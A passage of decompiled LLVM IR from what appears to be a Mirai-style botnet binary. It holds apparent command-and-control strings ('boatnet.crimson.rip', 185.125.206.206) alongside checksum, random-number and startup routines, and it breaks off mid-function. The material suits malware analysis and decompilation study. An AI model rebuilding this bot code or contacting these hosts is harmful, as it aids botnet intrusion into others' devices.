source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80555b0.2 = global i32 0
@global_var_80555c8.3 = local_unnamed_addr global i32* @global_var_80555b0.2
@global_var_8055670.5 = local_unnamed_addr global i32 0
@global_var_805567c.6 = local_unnamed_addr global i32 0
@global_var_8055674.7 = local_unnamed_addr global i32 0
@global_var_8055678.8 = local_unnamed_addr global i32 0
@global_var_80556d0.9 = local_unnamed_addr global i32 0
@global_var_80556a4.10 = local_unnamed_addr global i32 0
@global_var_80556fc.11 = local_unnamed_addr global i32 0
@global_var_80556ac.12 = local_unnamed_addr global i32 0
@global_var_80556aa.13 = local_unnamed_addr global i32 0
@global_var_80556b0.14 = local_unnamed_addr global i32 0
@global_var_80556a0.15 = global i32 0
@global_var_80556b8.17 = local_unnamed_addr global i32 0
@global_var_80556b4.18 = global i32 0
@global_var_80556c4.19 = local_unnamed_addr global i32 0
@global_var_805571c.20 = local_unnamed_addr global i32 0
@global_var_8055718.21 = local_unnamed_addr global i32 0
@global_var_8055680.23 = local_unnamed_addr global i32 0
@global_var_80556c8.24 = local_unnamed_addr global i32 0
@global_var_8053e82.25 = constant [3 x i8] c"\0D\0A\00"
@global_var_8053dc2.26 = constant [20 x i8] c"boatnet.crimson.rip\00"
@global_var_8053dd6.27 = constant [16 x i8] c"185.125.206.206\00"
@global_var_8055740.28 = global i32 0
@global_var_80556f4.30 = global i32 0
@global_var_8055840.31 = global i32 0
@global_var_80555dc.32 = global i32 0
@global_var_80558ec.34 = global i32 0
@global_var_80558f0.35 = local_unnamed_addr global i32 0
@global_var_80558f4.36 = global i32 0
@global_var_8055900.37 = local_unnamed_addr global i32 0
@global_var_8055bf4.38 = global i32 0
@global_var_8055c1c.39 = local_unnamed_addr global i32 0
@global_var_8055c0c.40 = local_unnamed_addr global i32 0
@global_var_8055c10.41 = local_unnamed_addr global i32 0
@global_var_8055c14.42 = local_unnamed_addr global i32 0
@global_var_8055c18.43 = local_unnamed_addr global i32 0
@global_var_8055c24.44 = local_unnamed_addr global i32 0
@global_var_8055c30.45 = local_unnamed_addr global i32 0
@global_var_8055c28.46 = local_unnamed_addr global i32 0
@global_var_8055c34.47 = local_unnamed_addr global i32 0
@global_var_8055c08.48 = local_unnamed_addr global i32 0
@global_var_8055c04.50 = local_unnamed_addr global i32 0
@global_var_8055c2c.51 = local_unnamed_addr global i32 0
@global_var_80558fc.52 = local_unnamed_addr global i32 0
@global_var_80555f4.53 = global i32 0
@global_var_805560c.55 = global i32 0
@global_var_80556d8.56 = local_unnamed_addr global i32 0
@global_var_80555a4.58 = global i32 -1
@global_var_8053353.59 = constant i32 -294069
@global_var_80556e8.60 = local_unnamed_addr global i32 0
@global_var_80556ec.61 = local_unnamed_addr global i32 0
@global_var_8054284.62 = constant [10 x i8] c"/dev/null\00"
@global_var_80556e4.64 = local_unnamed_addr global i32 0
@global_var_80556dc.65 = local_unnamed_addr global i32 0
@global_var_80556e0.66 = local_unnamed_addr global i32 0
@global_var_80543a0.68 = constant i32 33554944
@global_var_8053539.69 = constant i32 1928542531
@global_var_805355d.70 = constant i32 1928542531
@global_var_80556f8.71 = local_unnamed_addr global i32 0
@global_var_8055628.72 = local_unnamed_addr global i32* @global_var_80543a0.68
@global_var_8055c38.73 = local_unnamed_addr global i32 0
@global_var_8055c3c.74 = local_unnamed_addr global i32 0
@global_var_8055640.1 = local_unnamed_addr global i8 0
@global_var_80556b6.16 = local_unnamed_addr global i16 0
@global_var_80556cc.22 = local_unnamed_addr global i16 0
@global_var_80555d8.29 = local_unnamed_addr global i16 -1105
@global_var_80558c0.33 = global i8 0
@global_var_8055c20.49 = local_unnamed_addr global i8 0
@global_var_80556d4.54 = local_unnamed_addr global i8 0
@global_var_80556f0.63 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 54555
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8053d70()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8055640.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80555c8.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80555c8.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80555c8.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8055640.1, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80555c8.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8055640.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134563232)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_80533ef(i32 134532720, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134561174, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v4_80481a18 = zext i8 %arg1 to i32
  %v2_80481a5 = icmp eq i8 %arg1, 0
  br i1 %v2_80481a5, label %dec_label_pc_80481d3, label %dec_label_pc_80481b0

dec_label_pc_80481b0:                             ; preds = %entry
  %v3_80481b4 = add i32 %v5_8048166, 4
  %v4_80481b4 = inttoptr i32 %v3_80481b4 to i8*
  %v5_80481b4 = load i8, i8* %v4_80481b4, align 4
  %v16_80481b4 = icmp eq i8 %v5_80481b4, -108
  br i1 %v16_80481b4, label %dec_label_pc_80481db, label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %dec_label_pc_80481b0
  br label %dec_label_pc_80481ce

dec_label_pc_80481c0:                             ; preds = %dec_label_pc_80481ce
  %v1_80481c0 = add i32 %v0_80481c3.in, 12
  %v2_80481c0 = inttoptr i32 %v1_80481c0 to i8*
  %v3_80481c0 = load i8, i8* %v2_80481c0, align 4
  %v4_80481c0 = zext i8 %v3_80481c0 to i32
  %v6_80481c0 = and i32 %v5_80481c0, -256
  %v7_80481c0 = or i32 %v4_80481c0, %v6_80481c0
  %v16_80481c8 = icmp eq i8 %v3_80481c0, -108
  br i1 %v16_80481c8, label %dec_label_pc_80481db, label %dec_label_pc_80481ce

dec_label_pc_80481ce:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b9
  %v5_80481c0 = phi i32 [ %v7_80481c0, %dec_label_pc_80481c0 ], [ 148, %dec_label_pc_80481b9 ]
  %v0_80481c3.in = phi i32 [ %v0_80481c3, %dec_label_pc_80481c0 ], [ %v5_8048166, %dec_label_pc_80481b9 ]
  %v0_80481ce = phi i32 [ %v1_80481ce, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_80481b9 ]
  %v0_80481c3 = add i32 %v0_80481c3.in, 8
  %v1_80481ce = add i32 %v0_80481ce, 1
  %v12_80481cf = icmp eq i32 %v1_80481ce, %v4_80481a18
  %v1_80481d1 = icmp eq i1 %v12_80481cf, false
  br i1 %v1_80481d1, label %dec_label_pc_80481c0, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %dec_label_pc_80481ce, %entry
  ret i32 134561174

dec_label_pc_80481db:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b0
  %v0_80481db = phi i32 [ %v5_8048166, %dec_label_pc_80481b0 ], [ %v0_80481c3, %dec_label_pc_80481c0 ]
  %v1_80481db = inttoptr i32 %v0_80481db to i32*
  %v2_80481db = load i32, i32* %v1_80481db, align 4
  ret i32 %v2_80481db

; uselistorder directives
  uselistorder i32 %v0_80481c3.in, { 1, 0 }
  uselistorder i32 %v5_8048166, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
}

define i32 @function_804bd90() local_unnamed_addr {
dec_label_pc_804bd90:
  %tmp = call i16* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804bd97 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd90, %dec_label_pc_804bda0
  %v0_804bdae = phi i32 [ %v2_804bdae, %dec_label_pc_804bda0 ], [ 0, %dec_label_pc_804bd90 ]
  %v0_804bda3 = phi i32 [ %v1_804bda3, %dec_label_pc_804bda0 ], [ %tmp11, %dec_label_pc_804bd90 ]
  %v0_804bdab = phi i32 [ %v1_804bdab, %dec_label_pc_804bda0 ], [ %v4_804bd97, %dec_label_pc_804bd90 ]
  %v1_804bda0 = inttoptr i32 %v0_804bdab to i16*
  %v2_804bda0 = load i16, i16* %v1_804bda0, align 2
  %v3_804bda0 = zext i16 %v2_804bda0 to i32
  %v1_804bda3 = add i32 %v0_804bda3, -2
  %v1_804bdab = add i32 %v0_804bdab, 2
  %v2_804bdae = add i32 %v3_804bda0, %v0_804bdae
  %v5_804bdb0 = icmp eq i32 %v1_804bda3, 0
  %v9_804bdb0 = icmp eq i32 %v0_804bda3, 3
  %v2_804bdb3 = or i1 %v9_804bdb0, %v5_804bdb0
  br i1 %v2_804bdb3, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bd90
  %v0_804bdbb = phi i32 [ 0, %dec_label_pc_804bd90 ], [ %v2_804bdae, %dec_label_pc_804bda0 ]
  %v0_804bdb8 = phi i32 [ %v4_804bd97, %dec_label_pc_804bd90 ], [ %v1_804bdab, %dec_label_pc_804bda0 ]
  %v0_804bdb5 = phi i32 [ %tmp11, %dec_label_pc_804bd90 ], [ %v1_804bda3, %dec_label_pc_804bda0 ]
  %v8_804bdb5 = icmp eq i32 %v0_804bdb5, 1
  %v1_804bdb6 = icmp eq i1 %v8_804bdb5, false
  br i1 %v1_804bdb6, label %dec_label_pc_804bdbd, label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bdb5
  %v1_804bdb8 = inttoptr i32 %v0_804bdb8 to i8*
  %v2_804bdb8 = load i8, i8* %v1_804bdb8, align 1
  %v3_804bdb8 = sext i8 %v2_804bdb8 to i32
  %v2_804bdbb = add i32 %v3_804bdb8, %v0_804bdbb
  br label %dec_label_pc_804bdbd

dec_label_pc_804bdbd:                             ; preds = %dec_label_pc_804bdb5, %dec_label_pc_804bdb8
  %v0_804bdbd = phi i32 [ %v0_804bdbb, %dec_label_pc_804bdb5 ], [ %v2_804bdbb, %dec_label_pc_804bdb8 ]
  %v1_804bdbf = urem i32 %v0_804bdbd, 65536
  %v2_804bdc2 = udiv i32 %v0_804bdbd, 65536
  %v2_804bdc6 = add nuw nsw i32 %v1_804bdbf, %v2_804bdc2
  %v2_804bdca = udiv i32 %v2_804bdc6, 65536
  %v2_804bdcd = add nuw nsw i32 %v2_804bdca, %v2_804bdc6
  %v1_804bdcf = urem i32 %v2_804bdcd, 65536
  %v1_804bdd2 = xor i32 %v1_804bdcf, 65535
  ret i32 %v1_804bdd2

; uselistorder directives
  uselistorder i32 %v2_804bdc6, { 1, 0 }
  uselistorder i32 %v0_804bdbb, { 1, 0 }
  uselistorder i32 %v1_804bda3, { 0, 2, 1 }
  uselistorder i32 %v4_804bd97, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bda0, { 1, 0 }
}

define i32 @function_804bde0() local_unnamed_addr {
dec_label_pc_804bde0:
  %tmp14 = call i16* @__decompiler_undefined_function_2()
  %tmp15 = call i16 @__decompiler_undefined_function_3()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804bdf5 = ptrtoint i16* %tmp14 to i32
  %v1_804bdfe = add i32 %tmp17, 12
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  %v3_804bdfe = load i32, i32* %v2_804bdfe, align 4
  %v1_804be01 = add i32 %tmp17, 16
  %v2_804be01 = inttoptr i32 %v1_804be01 to i32*
  %v3_804be01 = load i32, i32* %v2_804be01, align 4
  %v7_804be07 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804be07, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be10:                             ; preds = %dec_label_pc_804bde0, %dec_label_pc_804be10
  %v0_804be1e = phi i32 [ %v2_804be1e, %dec_label_pc_804be10 ], [ 0, %dec_label_pc_804bde0 ]
  %v0_804be13 = phi i32 [ %v1_804be13, %dec_label_pc_804be10 ], [ %tmp16, %dec_label_pc_804bde0 ]
  %v0_804be1b = phi i32 [ %v1_804be1b, %dec_label_pc_804be10 ], [ %v4_804bdf5, %dec_label_pc_804bde0 ]
  %v1_804be10 = inttoptr i32 %v0_804be1b to i16*
  %v2_804be10 = load i16, i16* %v1_804be10, align 2
  %v3_804be10 = zext i16 %v2_804be10 to i32
  %v1_804be13 = add i32 %v0_804be13, -2
  %v1_804be1b = add i32 %v0_804be1b, 2
  %v2_804be1e = add i32 %v3_804be10, %v0_804be1e
  %v1_804be20 = add i32 %v0_804be13, -3
  %v6_804be20 = sub i32 2, %v0_804be13
  %v7_804be20 = and i32 %v1_804be13, %v6_804be20
  %v8_804be20 = icmp slt i32 %v7_804be20, 0
  %v9_804be20 = icmp eq i32 %v1_804be20, 0
  %v10_804be20 = icmp slt i32 %v1_804be20, 0
  %v3_804be23 = icmp eq i1 %v10_804be20, %v8_804be20
  %v4_804be23 = icmp eq i1 %v9_804be20, false
  %v5_804be23 = and i1 %v4_804be23, %v3_804be23
  br i1 %v5_804be23, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be10, %dec_label_pc_804bde0
  %v0_804be90 = phi i32 [ 0, %dec_label_pc_804bde0 ], [ %v2_804be1e, %dec_label_pc_804be10 ]
  %v0_804be8e = phi i32 [ %v4_804bdf5, %dec_label_pc_804bde0 ], [ %v1_804be1b, %dec_label_pc_804be10 ]
  %v0_804be25 = phi i32 [ %tmp16, %dec_label_pc_804bde0 ], [ %v1_804be13, %dec_label_pc_804be10 ]
  %v8_804be25 = icmp eq i32 %v0_804be25, 1
  br i1 %v8_804be25, label %dec_label_pc_804be8c, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be25, %dec_label_pc_804be8c
  %v0_804be36 = phi i32 [ %v0_804be90, %dec_label_pc_804be25 ], [ %v2_804be90, %dec_label_pc_804be8c ]
  %v2_804be2c = udiv i32 %v3_804be01, 65536
  %v1_804be2f = add i32 %tmp17, 9
  %v2_804be2f = inttoptr i32 %v1_804be2f to i8*
  %v3_804be2f = load i8, i8* %v2_804be2f, align 1
  %v1_804be32 = zext i8 %v3_804be2f to i16
  %v2_804be32 = call i16 @llvm.bswap.i16(i16 %v1_804be32)
  %v3_804be32 = zext i16 %v2_804be32 to i32
  %v2_804be36 = add i32 %v0_804be36, %v2_804be2c
  %v2_804be3e = add i32 %v2_804be36, %v3_804be32
  %v1_804be44 = urem i32 %v3_804bdfe, 65536
  %v2_804be4a = udiv i32 %v3_804bdfe, 65536
  %v1_804be51 = urem i32 %v3_804be01, 65536
  %v4_804be59 = zext i16 %tmp15 to i32
  %v2_804be4d = add nuw nsw i32 %v2_804be4a, %v4_804be59
  %v2_804be57 = add nuw nsw i32 %v2_804be4d, %v1_804be44
  %v2_804be64 = add nuw nsw i32 %v2_804be57, %v1_804be51
  %v2_804be66 = add i32 %v2_804be64, %v2_804be3e
  %tmp = icmp ult i32 %v2_804be66, 65536
  br i1 %tmp, label %dec_label_pc_804be7e, label %dec_label_pc_804be70

dec_label_pc_804be70:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be70
  %v2_804be753 = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794.in = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794 = udiv i32 %v2_804be794.in, 65536
  %v1_804be70 = urem i32 %v2_804be753, 65536
  %v2_804be75 = add nuw nsw i32 %v1_804be70, %v2_804be794
  %tmp25 = icmp ult i32 %v2_804be75, 65536
  %v1_804be7c = icmp eq i1 %tmp25, false
  br i1 %v1_804be7c, label %dec_label_pc_804be70, label %dec_label_pc_804be7e.loopexit

dec_label_pc_804be7e.loopexit:                    ; preds = %dec_label_pc_804be70
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804be7e.loopexit, %dec_label_pc_804be28
  %v0_804be7e = phi i32 [ %v2_804be75, %dec_label_pc_804be7e.loopexit ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v1_804be7e = urem i32 %v0_804be7e, 65536
  %v1_804be82 = xor i32 %v1_804be7e, 65535
  ret i32 %v1_804be82

dec_label_pc_804be8c:                             ; preds = %dec_label_pc_804be25
  %v1_804be8e = inttoptr i32 %v0_804be8e to i8*
  %v2_804be8e = load i8, i8* %v1_804be8e, align 1
  %v3_804be8e = zext i8 %v2_804be8e to i32
  %v2_804be90 = add i32 %v3_804be8e, %v0_804be90
  br label %dec_label_pc_804be28

; uselistorder directives
  uselistorder i32 %v2_804be75, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804be66, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804be20, { 1, 0 }
  uselistorder i32 %v1_804be13, { 0, 2, 1 }
  uselistorder i32 %v3_804be01, { 1, 0 }
  uselistorder i32 %v4_804bdf5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804be70, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804be10, { 1, 0 }
}

define i32 @function_804d5c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d5c0:
  %v0_804d5c0 = load i32, i32* @global_var_8055670.5, align 16
  %v0_804d5c8 = load i32, i32* @global_var_805567c.6, align 4
  %v2_804d5ce = mul i32 %v0_804d5c0, 2048
  %v2_804d5d3 = udiv i32 %v0_804d5c8, 524288
  store i32 %v2_804d5d3, i32* @ecx, align 4
  %v2_804d5d6 = xor i32 %v2_804d5ce, %v0_804d5c0
  %v0_804d5d8 = load i32, i32* @global_var_8055674.7, align 4
  store i32 %v0_804d5d8, i32* @global_var_8055670.5, align 16
  %v0_804d5e2 = load i32, i32* @global_var_8055678.8, align 8
  store i32 %v0_804d5e2, i32* @global_var_8055674.7, align 4
  store i32 %v0_804d5c8, i32* @global_var_8055678.8, align 8
  %v2_804d5f4 = xor i32 %v2_804d5d3, %v0_804d5c8
  %v2_804d5f6 = udiv i32 %v2_804d5d6, 256
  %v2_804d5f9 = xor i32 %v2_804d5f6, %v2_804d5d6
  %v2_804d5fb = xor i32 %v2_804d5f9, %v2_804d5f4
  store i32 %v2_804d5fb, i32* @global_var_805567c.6, align 4
  ret i32 %v2_804d5fb

; uselistorder directives
  uselistorder i32 %v2_804d5d6, { 1, 0 }
  uselistorder i32 %v2_804d5d3, { 1, 0 }
  uselistorder i32 %v0_804d5c8, { 1, 2, 0 }
  uselistorder i32 %v0_804d5c0, { 1, 0 }
}

define i32 @function_804d7f0() local_unnamed_addr {
dec_label_pc_804d7f0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804d7f0 = load i32, i32* @ebx, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v1_804d7f8 = icmp eq i32 %tmp, 0
  br i1 %v1_804d7f8, label %dec_label_pc_804d7f0.dec_label_pc_804d820_crit_edge, label %dec_label_pc_804d7fc

dec_label_pc_804d7f0.dec_label_pc_804d820_crit_edge: ; preds = %dec_label_pc_804d7f0
  br label %dec_label_pc_804d820

dec_label_pc_804d7fc:                             ; preds = %dec_label_pc_804d7f0
  %v1_804d7fc = add i32 %tmp, 4
  %v2_804d7fc = inttoptr i32 %v1_804d7fc to i32*
  %v3_804d7fc = load i32, i32* %v2_804d7fc, align 4
  %v1_804d7ff = icmp eq i32 %v3_804d7fc, 0
  br i1 %v1_804d7ff, label %dec_label_pc_804d80f, label %dec_label_pc_804d803

dec_label_pc_804d803:                             ; preds = %dec_label_pc_804d7fc
  %v1_804d807 = call i32 @function_8052c13(i32 %v3_804d7fc)
  br label %dec_label_pc_804d80f

dec_label_pc_804d80f:                             ; preds = %dec_label_pc_804d7fc, %dec_label_pc_804d803
  store i32 %v0_804d7f0, i32* @ebx, align 4
  %v1_804d816 = call i32 @function_8052c13(i32 %tmp)
  %v2_804d820.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804d820

dec_label_pc_804d820:                             ; preds = %dec_label_pc_804d7f0.dec_label_pc_804d820_crit_edge, %dec_label_pc_804d80f
  %v2_804d820 = phi i32 [ %tmp12, %dec_label_pc_804d7f0.dec_label_pc_804d820_crit_edge ], [ %v2_804d820.pre, %dec_label_pc_804d80f ]
  store i32 %v0_804d7f0, i32* @ebx, align 4
  ret i32 %v2_804d820

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804d820, { 1, 0 }
  uselistorder label %dec_label_pc_804d80f, { 1, 0 }
}

define i32 @function_804d830() local_unnamed_addr {
dec_label_pc_804d830:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp92 = call i8* @__decompiler_undefined_function_5()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804d83c = ptrtoint i8* %tmp92 to i32
  store i32 %v4_804d83c, i32* @ebx, align 4
  %v4_804d847 = call i32 @function_80525c2(i64 1, i32 8)
  %v2_804d850 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804d850, i32* %eax.global-to-local, align 4
  %tmp104 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804d85b = load i32, i32* @ebx, align 4
  %v4_804d85b = inttoptr i32 %v0_804d85b to i8*
  %v3_804d85e = call i32 @function_8050fc0(i8* %v4_804d85b)
  %v2_804d863 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804d863, i32* %ecx.global-to-local, align 4
  store i32 %v2_804d850, i32* %edi.global-to-local, align 4
  %v1_804d86e = add i32 %v3_804d85e, 1
  store i32 %v1_804d86e, i32* %eax.global-to-local, align 4
  %tmp105 = icmp slt i32 %v1_804d86e, 1
  br i1 %tmp105, label %dec_label_pc_804d89a, label %dec_label_pc_804d882.lr.ph

dec_label_pc_804d882.lr.ph:                       ; preds = %dec_label_pc_804d830
  %v0_804d882.pre = load i32, i32* @ebx, align 4
  %v4_804d882.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804d882

dec_label_pc_804d874:                             ; preds = %dec_label_pc_804d882
  %v3_804d874 = inttoptr i32 %v2_804d874 to i8*
  store i8 %v2_804d882, i8* %v3_804d874, align 1
  %v0_804d876 = load i32, i32* @esi, align 4
  %v1_804d876 = add i32 %v0_804d876, 1
  store i32 %v1_804d876, i32* @esi, align 4
  %v0_804d877 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d877 = add i32 %v0_804d877, 1
  store i32 %v1_804d877, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d87a

dec_label_pc_804d87a:                             ; preds = %dec_label_pc_804d88d, %dec_label_pc_804d874
  %v0_804d87c = phi i32 [ %v1_804d893, %dec_label_pc_804d88d ], [ %v1_804d877, %dec_label_pc_804d874 ]
  %v0_804d87a = load i32, i32* @ebx, align 4
  %v1_804d87a = add i32 %v0_804d87a, 1
  store i32 %v1_804d87a, i32* @ebx, align 4
  %v0_804d87b = load i32, i32* %eax.global-to-local, align 4
  %v1_804d87b = add i32 %v0_804d87b, -1
  store i32 %v1_804d87b, i32* %eax.global-to-local, align 4
  store i32 %v0_804d87c, i32* %ecx.global-to-local, align 4
  %tmp106 = icmp slt i32 %v1_804d87b, 1
  br i1 %tmp106, label %dec_label_pc_804d89a, label %dec_label_pc_804d882

dec_label_pc_804d882:                             ; preds = %dec_label_pc_804d882.lr.ph, %dec_label_pc_804d87a
  %v2_804d874 = phi i32 [ %v2_804d863, %dec_label_pc_804d882.lr.ph ], [ %v0_804d87c, %dec_label_pc_804d87a ]
